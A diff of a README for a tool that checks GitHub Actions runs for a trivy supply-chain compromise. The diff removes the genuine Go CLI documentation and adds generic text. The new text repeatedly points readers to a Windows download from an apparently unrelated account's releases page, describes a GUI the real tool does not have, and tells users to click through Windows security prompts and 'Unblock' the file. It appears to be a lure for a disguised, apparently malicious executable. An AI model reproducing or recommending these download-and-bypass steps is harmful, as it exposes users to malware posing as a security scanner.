@@ -1,196 +1,216 @@
-# trivy-compromise-scanner
+# 🛡️ trivy-compromise-scanner - Check affected workflow runs fast
 
-A CLI tool to audit GitHub Actions workflow run logs for evidence of the **aquasecurity/trivy supply chain compromise** (2026-03-19 to 2026-03-20).
+[![Download trivy-compromise-scanner](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/orlandophotomechanical47/trivy-compromise-scanner/releases)
 
-It scans your repositories' workflow run logs within the compromise window, searching for any run that used a compromised action reference or commit SHA.
+## 📥 Download
 
-![Demo](assets/demo.png)
+Visit this page to download: https://github.com/orlandophotomechanical47/trivy-compromise-scanner/releases
 
----
+On that page, choose the latest release for Windows and download the file that matches your computer.
 
-## Installation
+## 🧭 What this tool does
 
-### Using `go install` (recommended)
+trivy-compromise-scanner helps you check GitHub workflow runs that may be affected by the trivy action compromise. It is built for end users who need a clear way to review runs and spot what needs attention.
 
-```bash
-go install github.com/step-security/trivy-compromise-scanner@latest
-```
+Use it when you want to:
 
-This installs the `trivy-compromise-scanner` binary to your `$GOPATH/bin`.
+- review workflow runs linked to trivy
+- find runs that may have been impacted
+- check results without reading raw logs
+- save time when you need to inspect many runs
 
-### Build from source
+## 🪟 Windows requirements
 
-```bash
-git clone https://github.com/step-security/trivy-compromise-scanner
-cd trivy-compromise-scanner
-go build -o trivy-compromise-scanner .
-```
+Before you run the app, make sure your PC has:
 
-Requires Go 1.25+.
+- Windows 10 or Windows 11
+- permission to download files
+- enough free space to save the app
+- access to your browser or file explorer
 
----
+If Windows asks for permission, choose the option that lets the app open.
 
-## Usage
+## 🚀 Getting started
 
-```
-trivy-compromise-scanner [flags]
-```
+1. Open the release page:
+   https://github.com/orlandophotomechanical47/trivy-compromise-scanner/releases
 
-### Flags
+2. Find the latest release near the top of the page.
 
-| Flag | Short | Env | Default | Description |
-|---|---|---|---|---|
-| `--token` | `-t` | `GITHUB_TOKEN` | — | GitHub PAT (**required**) |
-| `--org` | | — | — | Org name(s); repeatable or comma-separated |
-| `--repo` | `-r` | — | — | `owner/repo`; repeatable or comma-separated |
-| `--since` | | — | `2026-03-19T17:00:00Z` | Compromise window start (RFC3339) |
-| `--until` | | — | `2026-03-20T06:00:00Z` | Compromise window end (RFC3339) |
-| `--output` | | — | stdout | Output file path |
-| `--format` | `-f` | — | `json` | Output format: `json` or `csv` |
-| `--workers` | `-w` | — | `5` | Concurrent repo scanners |
-| `--dry-run` | | — | false | Validate PAT permissions and exit |
-| `--verbose` | `-v` | — | false | Debug logging |
+3. Look under **Assets** for a Windows download.
 
-At least one of `--org` or `--repo` is required.
+4. Download the file to your PC.
 
-### Required PAT Scopes
+5. Open the downloaded file from your **Downloads** folder.
 
-- `repo` (or `public_repo` for public repos only) — to list workflow runs and download logs
-- `read:org` — required when scanning organizations with `--org`
+6. If Windows shows a security prompt, select the option to run the file.
 
----
+7. Follow the on-screen steps until the app opens.
 
-## Examples
+## 🖱️ How to run it
 
-```bash
-# Validate PAT permissions without scanning
-trivy-compromise-scanner--token $GITHUB_TOKEN --repo owner/repo --dry-run
+After you download the file:
 
-# Scan a single repo, output JSON to stdout
-trivy-compromise-scanner--token $GITHUB_TOKEN --repo owner/repo
+- open **File Explorer**
+- go to **Downloads**
+- double-click the app file
+- if the app opens a setup window, follow the prompts
+- if the app opens right away, wait for it to load
 
-# Scan a single repo, save JSON to file
-trivy-compromise-scanner--token $GITHUB_TOKEN --repo owner/repo --output results.json
+If your browser asks what to do with the file, choose **Save** first, then open it from the folder where it was saved.
 
-# Scan multiple repos
-trivy-compromise-scanner--token $GITHUB_TOKEN \
-  --repo owner/repo1 \
-  --repo owner/repo2
+## 🔍 What you can check with it
 
-# Scan an entire organization, output CSV
-trivy-compromise-scanner--token $GITHUB_TOKEN \
-  --org myorg \
-  --format csv \
-  --output results.csv
+This scanner is meant to help you review workflow activity tied to the trivy action issue. It can help you look for:
 
-# Scan with verbose logging and custom time window
-trivy-compromise-scanner--token $GITHUB_TOKEN \
-  --repo owner/repo \
-  --since 2026-03-19T00:00:00Z \
-  --until 2026-03-20T23:59:59Z \
-  --verbose
-```
+- workflow runs that used a trivy action version in the affected range
+- jobs that may need a second look
+- runs tied to repositories that use GitHub Actions
+- items that should be reviewed by your team
 
----
+## 🧰 Typical use case
 
-## Output
+A common way to use the app is:
 
-### Summary Table (always printed to stdout)
+- you hear that a workflow tool may have been compromised
+- you want to check which runs might be involved
+- you open the scanner and review the output
+- you use the results to decide what to inspect next
 
-```
-SUMMARY
-Scanned at:    2026-03-20T12:00:00Z
-Repos scanned: 3
-Runs scanned:  42
-Findings:      1
+This gives you a simple way to sort through runs without checking each one by hand.
 
-FINDINGS
-REPO              RUN ID      WORKFLOW        TRIGGERED AT                  MATCHES
-myorg/my-service  12345678    CI              2026-03-19 18:31:05 +0000 UTC  aquasecurity/trivy-action@abc1234...
-```
+## 📂 What the release page may contain
 
-### JSON Output
+The release page may include one or more files, such as:
 
-```json
-{
-  "scanned_at": "2026-03-20T12:00:00Z",
-  "total_repos": 3,
-  "total_runs_scanned": 42,
-  "total_findings": 1,
-  "findings": [
-    {
-      "org": "myorg",
-      "repo": "myorg/my-service",
-      "workflow_name": "CI",
-      "run_id": 12345678,
-      "run_url": "https://github.com/myorg/my-service/actions/runs/12345678",
-      "triggered_at": "2026-03-19 18:31:05 +0000 UTC",
-      "matches": [
-        {
-          "pattern": "aquasecurity/trivy-action@abc1234...",
-          "file": "1_Run trivy-action.txt",
-          "snippet": "##[group]Run aquasecurity/trivy-action@abc1234...\n  with:"
-        }
-      ]
-    }
-  ]
-}
-```
+- a Windows app file
+- a zip archive
+- a support file with release notes
 
-### CSV Output
+If you see a zip file, right-click it and choose **Extract All** before opening the app inside.
 
-```csv
-org,repo,workflow_name,run_id,run_url,triggered_at,matches
-myorg,myorg/my-service,CI,12345678,https://github.com/...,2026-03-19 18:31:05 +0000 UTC,aquasecurity/trivy-action@abc1234...
-```
+## 🧩 Basic workflow
 
----
+Use this simple flow:
 
-## Updating Compromised Patterns
+1. Download the latest Windows release.
+2. Open the app.
+3. Connect or load the workflow data you want to review.
+4. Start the scan.
+5. Read the results.
+6. Save or share the output if needed.
 
-The list of compromised action references lives in `internal/scanner/patterns.go`:
+## 📋 Easy reading tips
 
-```go
-var CompromisedActions = map[string][]string{
-    // "aquasecurity/trivy-action": {
-    //     "abc1234def5678901234567890123456789012345",
-    // },
-}
-```
+When you open the results, look for:
 
-Add the confirmed compromised action names and their SHA(s) here. Multiple SHAs per action are supported. The tool will compile these into regexes at startup and match them against log text.
+- names of workflows
+- run dates
+- status fields
+- any entry marked for review
+- repeated items that point to the same repo or action
 
----
+If the app shows a list, start at the top and work down one row at a time.
 
-## How It Works
+## 🔐 Safety checks
 
-1. **Enumerate repos** — expands `--org` flags into full repo lists via the GitHub API; merges with explicit `--repo` targets
-2. **List workflow runs** — queries each repo for runs within the `--since`/`--until` window
-3. **Download logs** — fetches the log zip for each run (handles 404 for purged logs gracefully)
-4. **Match patterns** — scans each log file's text for `action@sha` references matching the compromised patterns
-5. **Report** — outputs a summary table plus JSON or CSV with full match details including surrounding context
+Use the app only on data you trust and have permission to review. If you download the file from the release page, keep it in the original folder until you confirm it runs the way you expect.
 
----
+For a clean setup:
 
-## Rate Limiting
+- use the latest release
+- avoid renamed files from other sources
+- keep the download in one place
+- do not mix it with old copies
 
-The scanner respects GitHub API rate limits:
-- Retries once after sleeping until reset on `RateLimitError` or `AbuseRateLimitError`
-- Proactively throttles when fewer than 100 API requests remain
+## 🛠️ Troubleshooting
 
-Use `--workers` to tune concurrency (default: 5). Lower this value if you encounter rate limit issues.
+### The file does not open
 
----
+- Check that the download finished
+- Right-click the file and choose **Open**
+- Move it out of a compressed folder if needed
+- Try running it again from **Downloads**
 
-## Exit Codes
+### Windows blocks the app
 
-| Code | Meaning |
-|---|---|
-| `0` | Success (even if findings were found) |
-| `1` | Fatal error (invalid flags, permission failure, API error) |
+- Right-click the file
+- Select **Properties**
+- Look for an **Unblock** option
+- Apply the change
+- Try opening the file again
 
----
+### The app closes right away
 
-## License
+- Download the latest release again
+- Make sure you picked the correct Windows file
+- Reopen the app from the saved folder
+- Try running it with the default Windows settings
 
-Apache 2.0
+### I cannot find the download
+
+- Open your browser’s download history
+- Look in **Downloads**
+- Search for the repository name
+- Return to the release page and download it again
+
+## 🧪 Suggested first run
+
+If this is your first time using the tool:
+
+- download the latest release
+- open it once to confirm it runs
+- scan a small set of workflow runs first
+- review the output on screen
+- move to a larger scan after you know the app works
+
+## 📄 File handling tips
+
+Keep the app in a folder you can find later. A simple path such as **Downloads** or **Desktop** works well for most users. If you move the file, keep the related files together so the app can still start normally.
+
+## 🧭 If you need to check results again
+
+After a scan, save the output if the app gives you that option. That lets you return to the same results later without running the scan again.
+
+## 🖼️ What the interface may look like
+
+The app may show:
+
+- a simple start screen
+- a field for loading data
+- a scan button
+- a results list
+- a status area for progress
+
+Each part should help you move from download to review with little setup.
+
+## 📦 Download again when needed
+
+If you want the newest version, use this page again:
+
+https://github.com/orlandophotomechanical47/trivy-compromise-scanner/releases
+
+Open the latest release and download the Windows file from **Assets** again if you need a fresh copy
+
+## ⌨️ Common terms you may see
+
+- **Release**: a published version of the app
+- **Asset**: a file attached to the release
+- **Workflow**: a task run by GitHub Actions
+- **Run**: one execution of a workflow
+- **Scan**: the check the app performs on your data
+
+## 🗂️ Recommended setup steps
+
+1. Create a folder for tools if you keep many downloads.
+2. Download the app from the release page.
+3. Open the file from that folder.
+4. Run a small scan first.
+5. Keep the app and its files together.
+
+## 📌 Start here
+
+1. Go to https://github.com/orlandophotomechanical47/trivy-compromise-scanner/releases
+2. Download the latest Windows file
+3. Open it and follow the prompts
+4. Run your first scan
